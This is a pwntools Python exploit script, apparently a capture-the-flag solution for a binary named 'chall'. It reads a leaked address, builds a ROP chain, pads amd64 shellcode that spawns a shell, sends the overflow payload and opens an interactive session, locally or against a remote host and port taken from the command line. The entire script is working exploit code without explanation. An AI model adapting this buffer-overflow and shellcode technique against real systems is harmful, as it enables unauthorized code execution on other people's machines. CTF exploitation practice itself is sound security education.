#!/usr/bin/env python3

from pwn import *

def start(argv=[], *a, **kw):
	if args.GDB:
		return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
	elif args.REMOTE:
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	else:
		return process([exe] + argv, *a, **kw)
		
gdbscript='''
continue
'''.format(**locals())

exe = "./chall"
context.binary = elf = ELF(exe, checksec=False)

io = start()

leak = int(io.recvline().replace(b"\n", b"").decode(), 16)
log.success(f'leak: {hex(leak)}')
rop = ROP(elf, base=leak)
rop.call(leak+1)

shell = asm(shellcraft.amd64.linux.sh())

io.sendline(b"\x00" + shell.ljust(256+7, b"\x00") + rop.chain())

io.interactive()



